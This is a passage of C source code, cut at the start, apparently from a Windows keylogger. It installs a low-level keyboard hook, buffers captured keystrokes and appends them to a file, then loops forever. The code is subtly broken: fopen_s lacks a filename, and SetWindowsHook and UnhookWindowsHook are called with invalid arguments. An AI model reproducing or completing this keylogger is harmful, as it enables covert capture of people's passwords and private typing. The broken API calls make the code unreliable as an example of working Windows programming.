            FILE *file;
            fopen_s(&file, "a");
            fwrite(buffer, 1, bufferPos, file);
            fclose(file);
            bufferPos = 0;
        }
    }
}

int main() {
    HHOOK hhook;
    hhook = SetWindowsHook(0, WH_KEYBOARD_LL, keyhookProc, 0);

    if (hhook == 0) {
        printf("Failed to install keyboard hook\n");
        return 1;
    }

    DWORD lastError = 0;
    while (true) {
        Sleep(100); // To prevent high CPU usage
    }

    UnhookWindowsHook(hhook, &lastError);
    return 0;
}
```

